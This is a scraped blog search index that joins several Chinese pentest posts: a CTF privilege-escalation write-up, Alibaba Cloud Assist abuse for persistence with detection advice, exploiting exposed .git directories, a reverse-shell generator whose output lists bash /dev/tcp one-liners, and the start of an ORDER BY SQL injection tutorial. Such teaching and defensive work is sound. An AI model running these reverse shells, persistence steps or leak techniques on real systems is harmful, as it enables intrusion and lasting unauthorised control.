Content-Disposition: form-data; name=\"register_pass_min\" 8 -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"num_posts_all_topics\" 30 -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"num_posts_cat_topics\" 20 -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"num_posts_per_topic\" 20 -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"forum_attachments_path\" assets/img/attachments -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"forum_attachments_exts\" jpg,jpeg,png,gif,pjpeg,bmp,txt -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"forum_attachments_size\" 3 -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"forum_attachments_mimetypes\" image/*,text/plain -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"forum_tags_num\" 5 -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"forum_tags_len\" 15 -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"reply_min_chars\" 10 -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"insert_oembed_videos\" yes -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"forum_privacy\" everyone -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"approval_notify_mails\" -----------------------------337198322926933256222094173604 Co","date":"2023-12-04","objectID":"/posts/proving-grounds-codo/:2:1","tags":["OSCP","PG_Practice"],"title":"Proving Grounds Codo WriteUp","uri":"/posts/proving-grounds-codo/"},{"categories":["靶场"],"content":"PrivE ╔══════════╣ Searching passwords in config PHP files 'password' =\u003e 'FatPanda123', 直接提权，尝试密码复用 www-data@codo:/tmp$ su - su - Password: FatPanda123 id uid=0(root) gid=0(root) groups=0(root) python3 -c 'import pty;pty.spawn(\"/bin/bash\")'; root@codo:~# ls /root/ ls /root/ email2.txt proof.txt snap root@codo:~# cat /root/proof.txt cat /root/proof.txt 6a78eexxxxxxxxx6bad8f ","date":"2023-12-04","objectID":"/posts/proving-grounds-codo/:3:0","tags":["OSCP","PG_Practice"],"title":"Proving Grounds Codo WriteUp","uri":"/posts/proving-grounds-codo/"},{"categories":["Pentest"],"content":"Ali云助手权限维持 ","date":"2023-08-17","objectID":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:1:0","tags":["Pentest","权限维持","攻防技术"],"title":"022-Ali云助手权限维持","uri":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["Pentest"],"content":"简介 云助手是专为云服务器 ECS 打造的原生自动化运维工具，通过免密码、免登录、无需使用跳板机的形式，在 ECS 实例上实现批量运维、执行命令（Shell、PowerShell、Bat等）和发送文件等操作。 典型的使用场景包括：安装卸载软件、启动或停止服务、分发配置文件和执行一般的命令（或脚本）等。 但实际上也可以针对终端主机进行远程运维，因此可以用于实现权限维持。 官方文档： https://help.aliyun.com/zh/ecs/user-guide/overview-10 ","date":"2023-08-17","objectID":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:2:0","tags":["Pentest","权限维持","攻防技术"],"title":"022-Ali云助手权限维持","uri":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["Pentest"],"content":"利用 1、打开阿里云控制台，依次找到 产品与服务 -\u003e 云服务器 ECS -\u003e 运维与监控 -\u003e 发送命令/文件（云助手） -\u003e 托管实例 -\u003e 创建注册码： 2、输入配置信息，包括如下内容： 实例名称前缀 默认的实例名称。默认使用 hostname 作为实例名称。 若设置，则使用该注册码所注册的实例，将使用该名称作为前辍生成有序的实例名； 也可以在注册时指定新的实例名称以覆盖此默认值。 只可包含特殊字符中的点号（.）、下划线（_）、连字符（-）和半角冒号（:） 来源IP限制： 待注册的主机的访问互联网时的公网IP或IP范围，支持 IPv4、IPv6和CIDR地址段。 仅在主机注册阶段进行校验。 激活数额度： 注册码可激活的实例数，即此注册码最多可用于注册的次数。默认值10，最多可支持1000台。 有效期： 注册码的有效期，默认4小时，可选范围 1～876576小时（约100年，半永久😆 ）。 超出有效期后，该注册码不可用于注册新的主机。 3、点击生成注册码 当生成注册码后，会在下方显示实例注册的命令脚本内容。该注册码内容只显示一次，因此需要保存此注册码唯一ID与内容。 支持Linux 和Windows : Linux(.rpm) sudo wget https://aliyun-client-assist.oss-accelerate.aliyuncs.com/linux/aliyun_assist_latest.rpm sudo rpm -ivh aliyun_assist_latest.rpm --force sudo aliyun-service --register --RegionId \"cn-hangzhou\" \\ --ActivationCode \"a-hz012xxxxxL47fD/f\" \\ --ActivationId \"1DA9xxxxxxD244E7\" Linux(.deb) sudo wget https://aliyun-client-assist.oss-accelerate.aliyuncs.com/linux/aliyun_assist_latest.deb sudo dpkg -i aliyun_assist_latest.deb sudo aliyun-service --register --RegionId \"cn-hangzhou\" \\ --ActivationCode \"a-hz012xxxxxx47fD/f\" \\ --ActivationId \"1DA9xxxxxx3D244E7\" Windows Invoke-WebRequest -Uri ` 'https://aliyun-client-assist.oss-accelerate.aliyuncs.com/windows/aliyun_agent_latest_setup.exe' ` -OutFile 'C:\\\\aliyun_agent_latest_setup.exe' \u0026\"C:\\\\aliyun_agent_latest_setup.exe\" '/S' '--register' ` '--RegionId=\"cn-hangzhou\"' '--ActivationCode=\"a-hz012xxxxvttL47fD/f\"' ` '--ActivationId=\"1DA9xxxxx244E7\"' 生成的注册码中的关键参数就是 ActivationId值 和 ActivationCode值，Id和Code互相相互对应，可点击 “注册新实例” 处，查看过去建立生成的 ActivationId 值，但 ActivationCode值不可查。 使用阿里云给出的命令下载云助手agent，可能会出现权限不足的情况，需要将文件输出在当前用户可写的路径下。 第一段命令为下载云助手Agent，需要等待一段时间，也可以通过其他方式投递。 第二段命令为云助手Agent注册上线ECS云助手控制端。 在目标机器上运行相应脚本，执行完之后需要刷新或者重新打开一个标签页，即可展示结果： 执行命令相当于创建一个脚本，依次去执行； 远程登录即类似ECS，开启一个Web形式的终端 可以看到登录后即为system权限。 目前发现一些问题： 云助手Agent执行时有 UAC认证； Powershell执行命令下载文件时，需要等待。 在Windows Arm上会被识别为Ubuntu 只适合命令控制，传输文件大小有限制，上传的文件原始大小不大于24KB，且经过Base64编码后的文件不能大于32KB。因此更适合与命令控制和权限维持。 一条命令中，自定义参数的个数不能超过20个 ","date":"2023-08-17","objectID":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:3:0","tags":["Pentest","权限维持","攻防技术"],"title":"022-Ali云助手权限维持","uri":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["Pentest"],"content":"排查 云助手Agent： 运行云助手后，Windows系统上会有一个 aliyun_agent的进程和一个AliyunService服务，该进程服务会开机自启。 云助手守护进程： 本地结束该进程后，远程连接即可终端。未发现进程保护等动作。 查了文档发现其实有守护进程，只是目前仅支持Linux操作系统。 云助手守护进程，用于监控云助手Agent的资源消耗情况，上报云助手Agent的运行状态，以及当云助手Agent崩溃时重启云助手Agent。 服务名称：AssistDaemon 路径：/usr/local/share/assist-daemon/assist_daemon 任务执行路径： 云助手会将用户的命令内容以文件形式先保存到实例上，然后再执行文件，具体保存路径如下： Linux：/tmp Windows：云助手安装路径/work/script 通信流量： 本地Agent上线后会先对域名进行解析，根据命令行中--RegionId=\"cn-hangzhou\"的键值，会寻找相应的节点，这里就是cn-hangzhou.axt.aliyuncs.com。 从TLS协议握手过程可以看到Server Name为cn-hangzhou.axt.aliyuncs.com，接下去所走的流量都是TLS加密流量。 ","date":"2023-08-17","objectID":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:4:0","tags":["Pentest","权限维持","攻防技术"],"title":"022-Ali云助手权限维持","uri":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["Pentest"],"content":"特征： 检测阿里云助手官方程序，确认是否本人安装 域名：aliyun-client-assist.oss-accelerate.aliyuncs.com，用于下载云助手Agent程序，可被绕过通过其他方式投递。 通信流量，DNS解析记录有*.axt.aliyuncs.com，TLS Client Hello 证书握手时Server Name是*.axt.aliyuncs.com 进程名：aliyun_agent，服务名：Aliyun Assist Service Linux系统守护进程：AssistDaemon 天眼分析中心日志检测，SSL加密协商：server_name: (*.axt.aliyuncs.com) ","date":"2023-08-17","objectID":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:5:0","tags":["Pentest","权限维持","攻防技术"],"title":"022-Ali云助手权限维持","uri":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["Pentest"],"content":"处置 杀进程，关闭服务 删除被非法安装的Ali云助手 排查其他权限维持动作并清除。 增加流量侧和终端侧检测，标记md5和域名。 ","date":"2023-08-17","objectID":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:6:0","tags":["Pentest","权限维持","攻防技术"],"title":"022-Ali云助手权限维持","uri":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["Pentest"],"content":"参考文章： https://mp.weixin.qq.com/s/-JqzD_F_5CqdwZAyhEBU8g ","date":"2023-08-17","objectID":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:7:0","tags":["Pentest","权限维持","攻防技术"],"title":"022-Ali云助手权限维持","uri":"/posts/022-ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["Pentest"],"content":"git源码泄露 ","date":"2023-08-15","objectID":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/:1:0","tags":["Pentest","Leaks"],"title":"021-Git泄露文件还原","uri":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/"},{"categories":["Pentest"],"content":"自动化 利用脚本： Githack 遇到了一个git泄露，使用工具进行利用，失败。 手动获取 git 目录下文件成功，于是想手动利用下该漏洞，并了解下漏洞利用原理。 ","date":"2023-08-15","objectID":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/:2:0","tags":["Pentest","Leaks"],"title":"021-Git泄露文件还原","uri":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/"},{"categories":["Pentest"],"content":"目录结构 首先 git 目录文件结构，通常包含以下内容： COMMIT_EDITMSG branches config # 项目的 Git 配置文件 description HEAD # 包含对当前分支的引用的文件 index hooks/ info/ logs/ objects/ # 目录，存储 Git 对象 refs/ .git 文件夹存储项目的元数据和对象。这里的“对象”包括“blob”、“tree”、“commit”和“tag”。 blob — 用来存储文件数据的一个文件 tree — 引用了一堆其他tree 或 blob commit — 一个单独的tree，标记为项目在某个时间点的样子。 tag — 以某种方式将特定提交进行O标记。 以下是 .git 目录中的一些标准文件和文件夹，它们对于重建项目源代码非常重要。 ","date":"2023-08-15","objectID":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/:3:0","tags":["Pentest","Leaks"],"title":"021-Git泄露文件还原","uri":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/"},{"categories":["Pentest"],"content":"/objects目录 /objects 目录用于存储 Git 对象。 该目录包含其他文件夹，每个文件夹都有两个角色名称。这些子目录以存储在其中的 git 对象的 SHA1 哈希值的前两个字符命名。 在这些子目录中，有一些以存储在其中的 git 对象的 SHA1 哈希值命名的文件。 例如，下面的命令将返回文件夹列表： \u003e ls .git/objects 00 0a 14 5a 64 6e 82 8c 96 a0 aa b4 be c8 d2 dc e6 f0 fa info pack 此命令将显示存储在该特定文件夹中的 git 对象： \u003e ls .git/objects/0a 082f2656a655c8b0a87956c7bcdc93dfda23f8 4a1ee2f3a3d406411a72e1bea63507560092bd 66452433322af3d319a377415a890c70bbd263 8c20ea4482c6d2b0c9cdaf73d4b05c2c8c44e9 ee44c60c73c5a622bb1733338d3fa964b333f0 0ec99d617a7b78c5466daa1e6317cbd8ee07cc 52113e4f248648117bc4511da04dd4634e6753 72e6850ef963c6aeee4121d38cf9de773865d8 Git 对象根据其 SHA1 哈希值的前两个字符存储在 /objects 中。 例如，哈希值为0a082f2656a655c8b0a87956c7bcdc93dfda23f8 的 Git 对象将以文件名 082f2656a655c8b0a87956c7bcdc93dfda23f8 存储在目录 .git/objects/0a 中。 Git 在 .git/objects 中存储不同类型的对象。这里存储的对象可以是commit,、tree、blob 和带注释的tag。您可以使用以下命令确定对象的类型： \u003e git cat-file -t \u003cOBJECT-HASH\u003e 这个hash需要写完整的哈希而不是单纯的文件名 ┌──(xavier💀Desktop-AQ550M)-[~/…/gitlab/git/objects/0a] └─$ ls 66007207cbbbf3fc8e506ca4bc9e7317770060 a78bbdd307fd4839b26d61166b5c0532064bec ┌──(xavier💀Desktop-AQ550M)-[~/…/gitlab/git/objects/0a] └─$ git cat-file -t 66007207cbbbf3fc8e506ca4bc9e7317770060 fatal: Not a valid object name 66007207cbbbf3fc8e506ca4bc9e7317770060 ┌──(xavier💀Desktop-AQ550M)-[~/…/gitlab/git/objects/0a] └─$ git cat-file -t 0a66007207cbbbf3fc8e506ca4bc9e7317770060 blob 提交对象存储有关提交的目录树对象哈希、父提交、作者、提交者、日期和提交消息的信息。 Tree对象包含提交的目录列表。 Blob 对象包含已提交的文件的副本（请阅读：实际源代码！）。而tag对象包含有关标记对象及其关联标记名称的信息。 您可以使用以下命令显示与 Git 对象关联的文件： \u003e git cat-file -p \u003cOBJECT-HASH\u003e ┌──(xavier💀Desktop-AQ550M)-[~/…/git/gitlab/git/objects] └─$ git cat-file -t 06a67bade0fd6621314daadc38300c908e989dd0 blob ┌──(xavier💀Desktop-AQ550M)-[~/…/git/gitlab/git/objects] └─$ git cat-file -p 06a67bade0fd6621314daadc38300c908e989dd0 # By Xavier import sys import requests import urllib3 import time urllib3.disable_warnings() ... ","date":"2023-08-15","objectID":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/:3:1","tags":["Pentest","Leaks"],"title":"021-Git泄露文件还原","uri":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/"},{"categories":["Pentest"],"content":"/config文件 /config 文件是项目的 Git 配置文件。如果该文件可访问，也许能够下载 .git 目录的全部内容。 ┌──(xavier💀Desktop-AQ550M)-[~/…/0727/git/gitlab/git] └─$ cat config [core] repositoryformatversion = 0 filemode = false bare = false logallrefupdates = true symlinks = false ignorecase = true [remote \"origin\"] url = git@github.com:Username/Projectname.git fetch = +refs/heads/*:refs/remotes/origin/* [branch \"master\"] remote = origin merge = refs/heads/master [pull] rebase = false ","date":"2023-08-15","objectID":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/:3:2","tags":["Pentest","Leaks"],"title":"021-Git泄露文件还原","uri":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/"},{"categories":["Pentest"],"content":"/head文件 /head文件是一个包含对当前分支的引用的文件 ┌──(xavier💀Desktop-AQ550M)-[~/…/0727/git/gitlab/git] └─$ cat HEAD ref: refs/heads/master ","date":"2023-08-15","objectID":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/:3:3","tags":["Pentest","Leaks"],"title":"021-Git泄露文件还原","uri":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/"},{"categories":["Pentest"],"content":".git泄露 尝试探测.git文件，可能有以下几种情况： 响应404，意味着应用程序的 .git 目录不向公众开放，无法通过这种方式泄露信息。 响应403，表示 .git 目录在服务器上可用，但您将无法直接访问该文件夹的根目录，因此无法列出该目录中包含的所有文件。 响应200，如果没有收到错误并且服务器响应 .git 目录的文档树，您可以直接浏览该文件夹的内容并检索其中包含的任何信息。 如果无法访问 /.git 文件夹的目录列表，即未开启目录遍历功能，则必须下载所需的每个文件，而不是从目录根目录递归下载。 但是，当目标文件具有复杂路径（例如“.git/objects/0a/72e6850ef963c6aeee4121d38cf9de773865d8”）时，如何找出服务器上的哪些文件可用？ 这就需要从已知存在的文件路径开始，例如“.git/HEAD”！阅读此文件将为您提供当前分支的引用（例如，.git/refs/heads/master），您可以使用它来查找系统上的更多文件。 \u003e cat .git/HEAD ref: refs/heads/master \u003e cat .git/refs/heads/master 0a66452433322af3d319a377415a890c70bbd263 \u003e git cat-file -t 0a66452433322af3d319a377415a890c70bbd263 commit \u003e git cat-file -p 0a66452433322af3d319a377415a890c70bbd263 tree 0a72e6850ef963c6aeee4121d38cf9de773865d8 从Web上就是： \u003e curl http://xxx.com/.git/HEAD \u003e curl http://xxx.com/.git/refs/heads/master \u003e wget http://xxx.com/.git/objects/0a/66452433322af3d319a377415a890c70bbd263 \u003e git cat-file -t 0a66452433322af3d319a377415a890c70bbd263 commit \u003e git cat-file -p 0a66452433322af3d319a377415a890c70bbd263 tree 0a72e6850ef963c6aeee4121d38cf9de773865d8 .git/refs/heads/master 文件将指向您存储提交目录树的相应对象哈希。可以看到该对象是一个提交，并且与树对象 0a72e6850ef963c6aeee4121d38cf9de773865d8 关联。 继续检查存储在 0a72e6850ef963c6aeee4121d38cf9de773865d8 的树对象时： \u003e git cat-file -p 0a72e6850ef963c6aeee4121d38cf9de773865d8 100644 blob 6ad5fb6b9a351a77c396b5f1163cc3b0abcde895 .gitignore 040000 blob 4b66088945aab8b967da07ddd8d3cf8c47a3f53c source.py 040000 blob 9a3227dca45b3977423bb1296bbc312316c2aa0d README 040000 tree 3b1127d12ee43977423bb1296b8900a316c2ee32 resources 您会发现一些源代码文件和其他对象树来探索。 在远程服务器上，您发现不同文件的请求看起来更像是这样： https://project.com/.git/HEAD # 判断 HEAD https://project.com/.git/refs/heads/master # 找到 HEAD 中存储的对象 https://project.com/.git/objects/0a/72e6850ef963c6aeee4121d38cf9de773865d8 # 访问与commit相关联的tree https://project.com/.git/objects/9a/3227dca45b3977423bb1296bbc312316c2aa0d # 下载 README 文件中存储的源代码 在这样的远程服务器上，您需要在读取下载的目标文件之前对其进行解压缩。这可以使用 Ruby 来完成： ruby -rzlib -e 'print Zlib::Inflate.new.inflate(STDIN.read)' \u003c OBJECT_FILE ","date":"2023-08-15","objectID":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/:4:0","tags":["Pentest","Leaks"],"title":"021-Git泄露文件还原","uri":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/"},{"categories":["Pentest"],"content":"敏感信息 之后就是从git泄露中去寻找有用的敏感信息，包括硬编码凭证、加密密钥和开发人员评论可快速了解系统。 ","date":"2023-08-15","objectID":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/:5:0","tags":["Pentest","Leaks"],"title":"021-Git泄露文件还原","uri":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/"},{"categories":["Pentest"],"content":"参考文件 Hacking Git Directories Exposed .git Directory Exploitation ","date":"2023-08-15","objectID":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/:6:0","tags":["Pentest","Leaks"],"title":"021-Git泄露文件还原","uri":"/posts/git%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/"},{"categories":["tools"],"content":"RevShell是一个基于Go语言的反弹Shell命令生成工具，旨在帮助安全研究人员和渗透测试人员在需要与目标主机建立反向连接时快速生成相应的Shell代码。","date":"2023-08-14","objectID":"/posts/revshell/","tags":["tools"],"title":"020-RevShell：一款好用的生成反弹Shell命令的工具","uri":"/posts/revshell/"},{"categories":["tools"],"content":"RevShell ","date":"2023-08-14","objectID":"/posts/revshell/:1:0","tags":["tools"],"title":"020-RevShell：一款好用的生成反弹Shell命令的工具","uri":"/posts/revshell/"},{"categories":["tools"],"content":"工具简介 RevShell是一个基于Go语言的反弹Shell命令生成工具，旨在帮助安全研究人员和渗透测试人员在需要与目标主机建立反向连接时快速生成相应的Shell代码。 目前支持的类型: bash、sh、nc、ruby、php、python、rcat、perl、socat、node、telnet、zsh、lua、golang、vlang、awk、crystal。 除了支持多种Shell类型外，revshell还可以运行在多个操作系统平台上，包括Mac、Linux和Windows。这使得用户可以在不同的环境中使用revshell来生成适用于目标主机操作系统的反弹Shell代码，提高了工具的灵活性和适用性。 项目地址：https://github.com/BetterDefender/revshell ","date":"2023-08-14","objectID":"/posts/revshell/:2:0","tags":["tools"],"title":"020-RevShell：一款好用的生成反弹Shell命令的工具","uri":"/posts/revshell/"},{"categories":["tools"],"content":"安装方式 自行编译运行 $ go build revshell.go 直接下载项目Releases中编译好的工具 https://github.com/BetterDefender/revshell/releases ","date":"2023-08-14","objectID":"/posts/revshell/:3:0","tags":["tools"],"title":"020-RevShell：一款好用的生成反弹Shell命令的工具","uri":"/posts/revshell/"},{"categories":["tools"],"content":"使用方法 $ ./revshell [IPADDR] [PORT] [LANGUAGE] ","date":"2023-08-14","objectID":"/posts/revshell/:4:0","tags":["tools"],"title":"020-RevShell：一款好用的生成反弹Shell命令的工具","uri":"/posts/revshell/"},{"categories":["tools"],"content":"使用示例 $ ./revshell 192.168.1.1 2222 bash ","date":"2023-08-14","objectID":"/posts/revshell/:5:0","tags":["tools"],"title":"020-RevShell：一款好用的生成反弹Shell命令的工具","uri":"/posts/revshell/"},{"categories":["tools"],"content":"MacOS $ ./revshell 192.168.1.1 2222 bash _____ _____ _ _ _ _____ | __ \\ / ____| | | | | / ____| | |__) |_____ __ | (___ | |__ ___| | | | | __ ___ _ __ | _ // _ \\ \\ / / \\___ \\| '_ \\ / _ \\ | | | | |_ |/ _ \\ '_ \\ | | \\ \\ __/\\ V / ____) | | | | __/ | | | |__| | __/ | | | |_| \\_\\___| \\_/ |_____/|_| |_|\\___|_|_| \\_____|\\___|_| |_| | 💻 Author: Gh0stX | 🍎 Version: 1.0 | ------------------------------------------ Bash -i: bash -i \u003e\u0026 /dev/tcp/192.168.1.1/2222 0\u003e\u00261 /bin/bash -i \u003e\u0026 /dev/tcp/192.168.1.1/2222 0\u003e\u00261 ------------------------------------------ Bash 196: 0\u003c\u0026196;exec 196\u003c\u003e/dev/tcp/192.168.1.1/2222; bash \u003c\u0026196 \u003e\u0026196 2\u003e\u0026196 0\u003c\u0026196;exec 196\u003c\u003e/dev/tcp/192.168.1.1/2222; /bin/bash \u003c\u0026196 \u003e\u0026196 2\u003e\u0026196 ------------------------------------------ Bash read line: exec 5\u003c\u003e/dev/tcp/192.168.1.1/2222;cat \u003c\u00265 | while read line; do $line 2\u003e\u00265 \u003e\u00265; done ------------------------------------------ Bash 5: bash -i 5\u003c\u003e /dev/tcp/192.168.1.1/2222 0\u003c\u00265 1\u003e\u00265 2\u003e\u00265 /bin/bash -i 5\u003c\u003e /dev/tcp/192.168.1.1/2222 0\u003c\u00265 1\u003e\u00265 2\u003e\u00265 ------------------------------------------ Bash UDP: bash -i \u003e\u0026 /dev/udp/192.168.1.1/2222 0\u003e\u00261 /bin/bash -i \u003e\u0026 /dev/udp/192.168.1.1/2222 0\u003e\u00261 ","date":"2023-08-14","objectID":"/posts/revshell/:5:1","tags":["tools"],"title":"020-RevShell：一款好用的生成反弹Shell命令的工具","uri":"/posts/revshell/"},{"categories":["tools"],"content":"Windows ","date":"2023-08-14","objectID":"/posts/revshell/:5:2","tags":["tools"],"title":"020-RevShell：一款好用的生成反弹Shell命令的工具","uri":"/posts/revshell/"},{"categories":["tools"],"content":"Linux ","date":"2023-08-14","objectID":"/posts/revshell/:5:3","tags":["tools"],"title":"020-RevShell：一款好用的生成反弹Shell命令的工具","uri":"/posts/revshell/"},{"categories":["tools"],"content":"总结 使用RevShell，您可以轻松生成所需的反弹Shell代码，从而在渗透测试、漏洞利用或安全评估等任务中更加高效地与目标主机进行交互和控制。 ———————————————— 版权声明：本文为CSDN博主「Gh0stX」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。 原文链接：https://blog.csdn.net/weixin_42575797/article/details/132188010 ","date":"2023-08-14","objectID":"/posts/revshell/:6:0","tags":["tools"],"title":"020-RevShell：一款好用的生成反弹Shell命令的工具","uri":"/posts/revshell/"},{"categories":["Pentest"],"content":"本篇文章作者Xavier，本文属i春秋原创奖励计划，首发于i春秋论坛，未经许可禁止转载。 原文地址：https://bbs.ichunqiu.com/thread-63491-1-1.html 之前一篇文章讲了GROUP BY 位置点的注入，这次讲下ORDER BY位置点的注入。 ","date":"2023-07-28","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:0:0","tags":["SQLi"],"title":"019-SQL注入之OrderBy位置点注入","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"order by简介 ORDER BY语句是SQL语法中用于对查询结果进行排序的子句。它可以按照一个或多个列的值进行升序（ASC）或降序（DESC）排序。 ","date":"2023-07-28","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:1:0","tags":["SQLi"],"title":"019-SQL注入之OrderBy位置点注入","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"语法 ORDER BY子句通常紧跟在SELECT语句的最后，用于指定排序的规则。下面是ORDER BY语句的一般语法形式： SELECT column_name, function(column_name) FROM table_name WHERE column_name operator value ORDER BY column_name1 [ASC|DESC], column_name2 [ASC|DESC], ... LIMIT num; 在ORDER BY子句中，可以指定一个或多个列作为排序的依据。按照指定的列顺序进行排序，每个列可以指定是升序（ASC）还是降序（DESC），默认是升序排序。 以下是一些常见的用法和注意事项： 排序单个列：可以通过列名指定要排序的列。例如，ORDER BY 列名 ASC表示按升序对该列进行排序，ORDER BY 列名 DESC表示按降序对该列进行排序。 排序多个列：可以按照多个列进行排序，多个列之间用逗号分隔。排序优先级按照列在ORDER BY子句中的顺序确定。 NULL值处理：在排序中，默认情况下NULL值会被视为最小值（升序排序）或最大值（降序排序）。可以使用NULLS FIRST或NULLS LAST指定NULL值在排序中的位置。 表达式排序：除了列名外，还可以使用表达式作为排序的依据。例如，可以使用函数、算术表达式或条件表达式进行排序。 排序方向：默认情况下，排序是升序的。可以使用ASC或DESC关键字明确指定排序方向。ASC表示升序（默认），DESC表示降序。 ORDER BY语句在查询结果中对记录进行排序，提供了灵活的排序功能，可以根据需要对结果集进行定制化排序。它对于按特定条件获取有序结果非常有用，例如按照日期、数值大小或字母顺序进行排序。 ","date":"2023-07-28","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:1:1","tags":["SQLi"],"title":"019-SQL注入之OrderBy位置点注入","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"order by 注入 通常order by注入有两个可能点，一个是列名（id）可控，一个是排序方向（desc）可控。 select * from table order by id desc 如果只能控制desc这个位置的参数，我们需要利用SQL语法的特性，通过拼接 desc,\u003ccolumn\u003e的形式控制列名作为注入点，即： select * from table order by id desc, column_name ","date":"2023-07-28","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:0","tags":["SQLi"],"title":"019-SQL注入之OrderBy位置点注入","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"1、本地环境 以MySQL为例进行讲解。 下面演示用到2个数据库，MySQL 5.7.26和MySQL8.0.31 # sqli-labs 数据库，版本5.7.26 mysql\u003e select * from users; +----+----------+------------+ | id | username | password | +----+----------+------------+ | 1 | Dumb | Dumb | | 2 | Angelina | I-kill-you | | 3 | Dummy | p@ssword | | 4 | secure | crappy | | 5 | stupid | stupidity | | 6 | superman | genious | | 7 | batman | mob!le | | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | 